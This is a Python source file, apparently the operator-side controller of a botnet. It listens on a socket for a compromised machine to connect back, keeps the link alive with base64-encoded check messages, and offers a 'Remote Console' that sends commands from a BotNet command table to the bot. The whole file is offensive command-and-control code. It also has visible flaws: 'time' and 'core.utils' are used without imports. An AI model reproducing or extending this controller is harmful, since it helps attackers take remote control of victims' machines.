import socket
import os
import threading
import base64
from BotNet import *
from misc.messages import help_message

class Connection:
    
  def __init__(self, bind_ip, bind_port, id_):
    self.bind_ip = bind_ip
    self.bind_port = bind_port
    self.id = id_

    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  def EnterController(self, connalivethread=True):
    self.sock.bind((self.bind_ip, self.bind_port))
    self.sock.listen(99999999)
    self.stopped = False

    print(f'[{Y}*{N}] Waiting for connection...')
    self.conn, addr = self.sock.accept()
    print(f'[{G}+{N}] Connected by {Y}'+addr[0]+':'+str(addr[1])+N)

    if connalivethread:
      self.connalivethread_ = threading.Thread(target=self.ConnectionIsAlive)
      self.connalivethread_.start()
    
    print(f'[{Y}*{N}] Enter command "help"')
    
    while not self.stopped:
      rc_inp = f'{R}Remote {G}Console{N} [{self.id}]> '
      command = input(rc_inp)
      command = core.utils.parse_args(command)
      if not command[0] in BotNet.commands:
        print(f'[{R}-{N}] Command not found.')
      else:
        BotNet.commands[command[0]](self, command[1:])

  def _ConnectionIsAlive(self):
      try:
        self.conn.send(base64.b64encode(b'ischeck;'))
        return True
      except:
         return False
  def ConnectionIsAlive(self):
    while True:
      if self._ConnectionIsAlive():
        pass
      else:
        if not self.stopped:
          print(f'\n[{R}-{N}] Connection refused!')
          os._exit(0)
        else:
          print(f'\n[{G}+{N}] Server shutdown!')
          os._exit(0)
      time.sleep(3)
